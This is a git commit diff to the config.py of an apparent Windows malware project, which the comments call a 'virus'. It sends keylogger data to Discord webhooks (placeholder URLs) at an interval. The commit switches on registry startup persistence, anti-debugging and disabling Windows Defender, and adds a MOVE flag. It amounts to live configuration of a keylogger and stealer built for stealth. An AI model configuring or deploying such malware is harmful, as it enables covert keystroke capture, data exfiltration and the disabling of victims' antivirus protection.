ad08ff6e244d7de93e51458290eaa43e2413e1df
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-23 20:11:32 +0200

    Update config.py

--- config.py
+++ config.py
@@ -2,8 +2,9 @@
 WEBHOOK = 'https://discord.com/api/webhooks/ID/TOKEN'  #<== discord webhook
 WEBHOOK_KEYLOGGER = 'https://discord.com/api/webhooks/ID/TOKEN' #<== discord webhook for keylogger
 INTERVAL = 300 #<= Interval for keylogger data sending (in secondes)
-STARTUP = False #<== Put the virus to startup reg value so that virus starts on every boot on/off
+STARTUP = True #<== Put the virus to startup reg value so that virus starts on every boot on/off
 KEYLOGGER = True #<== Keylogger on/off 
-ERROR = True #<== Show fake error when running virus on/off
-ANTIDEBUG = False #<== Antidebug on/off 
-DEFENDER = False ##<== Disable windows defender on/off 
+ERROR = False #<== Show fake error when running virus on/off
+ANTIDEBUG = True #<== Antidebug on/off 
+DEFENDER = True ##<== Disable windows defender on/off 
+MOVE = True
